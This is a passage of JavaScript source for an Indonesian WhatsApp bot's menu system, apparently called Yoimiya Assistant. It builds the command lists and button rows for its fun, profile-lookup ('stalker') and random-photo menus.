            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'funmenubutton': { 
  let teks =`┏『 *\`乂 ғ ᴜ ɴ - ᴍ ᴇ ɴ ᴜ 乂\`* 』━◧
║◦ *${prefix}smeme*
║◦ *${prefix}ppcouple*
║◦ *${prefix}define*
║◦ *${prefix}qc*
║◦ *${prefix}qcwarna*
║◦ *${prefix}kodeqc*
║◦ *${prefix}lyrics*
║◦ *${prefix}suit*
║◦ *${prefix}math*
║◦ *${prefix}tictactoe*
║◦ *${prefix}fact*
║◦ *${prefix}truth*
║◦ *${prefix}dare*
║◦ *${prefix}couple*
║◦ *${prefix}soulmate*
║◦ *${prefix}stupidcheck*
║◦ *${prefix}handsomecheck*
║◦ *${prefix}uncleancheck*
║◦ *${prefix}hotcheck*
║◦ *${prefix}smartcheck*
║◦ *${prefix}greatcheck*
║◦ *${prefix}evilcheck*
║◦ *${prefix}dogcheck*
║◦ *${prefix}coolcheck*
║◦ *${prefix}waifucheck*
║◦ *${prefix}awesomecheck*
║◦ *${prefix}gaycheck*
║◦ *${prefix}cutecheck*
║◦ *${prefix}lesbiancheck*
║◦ *${prefix}hornycheck*
║◦ *${prefix}prettycheck*
║◦ *${prefix}lovelycheck*
║◦ *${prefix}uglycheck*
║◦ *${prefix}pick*
║◦ *${prefix}quotes*
║◦ *${prefix}can*
║◦ *${prefix}is*
║◦ *${prefix}when*
║◦ *${prefix}where*
║◦ *${prefix}what*
║◦ *${prefix}how*
║◦ *${prefix}rate*
║◦ *${prefix}cry*
║◦ *${prefix}kill*
║◦ *${prefix}hug*
║◦ *${prefix}pat*
║◦ *${prefix}lick*
║◦ *${prefix}kiss*
║◦ *${prefix}bite*
║◦ *${prefix}yeet*
║◦ *${prefix}bully*
║◦ *${prefix}bonk*
║◦ *${prefix}wink*
║◦ *${prefix}poke*
║◦ *${prefix}nom*
║◦ *${prefix}slap*
║◦ *${prefix}smile*
║◦ *${prefix}wave*
║◦ *${prefix}awoo*
║◦ *${prefix}blush*
║◦ *${prefix}smug*
║◦ *${prefix}glomp*
║◦ *${prefix}happy*
║◦ *${prefix}dance*
║◦ *${prefix}cringe*
║◦ *${prefix}cuddle*
║◦ *${prefix}highfive*
║◦ *${prefix}shinobu*
║◦ *${prefix}handhold*
║◦ *${prefix}spank*
║◦ *${prefix}tickle*
║◦ *${prefix}avatar*
║◦ *${prefix}feed*
║◦ *${prefix}foxgirl*
║◦ *${prefix}gecg*
║◦ *${prefix}checkme*
║◦ *${prefix}sound1 - sound161*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'stalkermenubutton': {
let teks =`┏『 *\`乂 s ᴛ ᴀ ʟ ᴋ ᴇ ʀ 乂\`* 』━◧
║◦ *${prefix}igstalk* IG Stalker
║◦ *${prefix}ttstalk* TT Stalker
║◦ *${prefix}ffstalk* FF Stalker
║◦ *${prefix}mlstalk* ML Stalker
║◦ *${prefix}npmstalk* NPM Stalker
║◦ *${prefix}ghstalk* GH Stalker
┗━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'randomphotomenubutton': {
let teks =`┏『 *\`乂 ʀ ᴀ ɴ ᴅ ᴏ ᴍ - ᴘ ʜ ᴏ ᴛ ᴏ 乂\`* 』━◧
║◦ *${prefix}aesthetic*
║◦ *${prefix}coffee*
║◦ *${prefix}wikimedia*
║◦ *${prefix}wallpaper*
║◦ *${prefix}art*
║◦ *${prefix}bts*
║◦ *${prefix}dogwoof*
║◦ *${prefix}catmeow*
║◦ *${prefix}lizardpic*
║◦ *${prefix}goosebird*
║◦ *${prefix}8ballpool*
║◦ *${prefix}cosplay*
║◦ *${prefix}hacker*
║◦ *${prefix}cyber*
║◦ *${prefix}gamewallpaper*
║◦ *${prefix}islamic*
║◦ *${prefix}jennie*
║◦ *${prefix}jiso*
║◦ *${prefix}satanic*
║◦ *${prefix}justina*
║◦ *${prefix}cartoon*
║◦ *${prefix}pentol*
║◦ *${prefix}cat*
║◦ *${prefix}kpop*
║◦ *${prefix}exo*
║◦ *${prefix}lisa*
║◦ *${prefix}space*
║◦ *${prefix}car*
║◦ *${prefix}technology*
║◦ *${prefix}bike*
║◦ *${prefix}shortquote*
║◦ *${prefix}antiwork*
║◦ *${prefix}hacking*
║◦ *${prefix}boneka*
║◦ *${prefix}rose*
║◦ *${prefix}ryujin*
║◦ *${prefix}ulzzangboy*
║◦ *${prefix}ulzzanggirl*
║◦ *${prefix}wallml*
║◦ *${prefix}wallphone*
║◦ *${prefix}mountain*
║◦ *${prefix}goose*
║◦ *${prefix}profilepic*
║◦ *${prefix}couplepic*
║◦ *${prefix}programming*
║◦ *${prefix}pubg*
║◦ *${prefix}blackpink*
║◦ *${prefix}randomboy*
║◦ *${prefix}randomgirl*
║◦ *${prefix}hijab*
║◦ *${prefix}chinese*
║◦ *${prefix}indo*
║◦ *${prefix}japanese*
║◦ *${prefix}korean*
║◦ *${prefix}malay*
║◦ *${prefix}thai*
║◦ *${prefix}vietnamese*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
